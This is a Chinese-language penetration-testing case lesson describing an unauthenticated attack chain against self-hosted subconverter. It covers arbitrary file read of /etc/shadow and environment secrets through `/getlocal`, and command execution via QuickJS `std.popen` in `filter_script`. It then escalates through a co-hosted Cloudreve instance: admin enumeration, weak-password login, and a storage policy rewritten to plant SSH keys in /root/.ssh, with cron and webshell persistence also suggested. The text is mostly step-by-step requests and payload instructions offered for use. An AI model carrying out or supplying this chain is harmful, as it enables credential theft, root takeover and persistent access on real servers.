# 案例课：subconverter 双未授权链 —— `/getlocal` 任意读 + `filter_script` QuickJS RCE

> 来源：报告包 sansu6（2026-10）· 域：web-attack / 自建订阅转换
> 同宿主常同时跑 Cloudreve / 宝塔 / 发卡。

## 一句话

subconverter 默认无鉴权：`/getlocal?path=` 任意文件读（容器常 uid=0），`/sub?filter_script=` 把用户脚本丢进 QuickJS，`globalThis.std.popen()` 直接执行命令。同宿主 Cloudreve 管理员改存储策略可写 `/root/.ssh` → root。

## 侦察

```text
GET /version                 → subconverter vX.Y
GET /sub?target=clash&url=   → 200
GET /getlocal?path=/etc/passwd
```

## V1 任意读

- 绝对路径优先；失败再 `../../`
- 高价值：`/etc/shadow`、`/proc/self/environ`（env 里的 key/token）、`/proc/self/mountinfo`（宿主挂载）、`/proc/self/cgroup`
- 用 mountinfo 判断容器与宿主根，别把容器 uid=0 当宿主 root

## V2 QuickJS RCE

```text
GET /sub?target=clash&url=<任意>&filter_script=...
```

- 先 `Object.keys(globalThis)` 确认 `std`/`os` 是否存在
- `std.popen("id")`，回显走转换结果或错误体
- 无回显 → 写 `/tmp` 或 web 根，再用 V1 读回

## V3 同宿主 Cloudreve → root

1. `GET /api/v4/user/search?keyword=` 普通 token 可枚举管理员邮箱
2. 管理员弱口令 → `POST /api/v4/session/token`
3. `PUT /api/v4/admin/policy/{id}` 改本地策略：`dir_name_rule=/root/.ssh`
4. 上传 `authorized_keys` → SSH 登录
- 前提：Cloudreve 以 root 跑 + 本地存储策略可改绝对路径
- 同法写 `/etc/cron.d/`、web 根 webshell
- **打完 PUT 回原策略**，否则用户上传全落错目录

## 边界

- 新版 subconverter 可能移除 `std`；先枚举全局对象
- `/getlocal` 有的版本只允许相对路径
- 容器 RCE ≠ 宿主 root

## 检查清单

- [ ] `/version` 指纹
- [ ] `/getlocal` 只读验证
- [ ] `std.popen("id")` 只跑 id/hostname
- [ ] 同宿主 5212/宝塔/MySQL 探测
- [ ] 写操作前备份策略

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
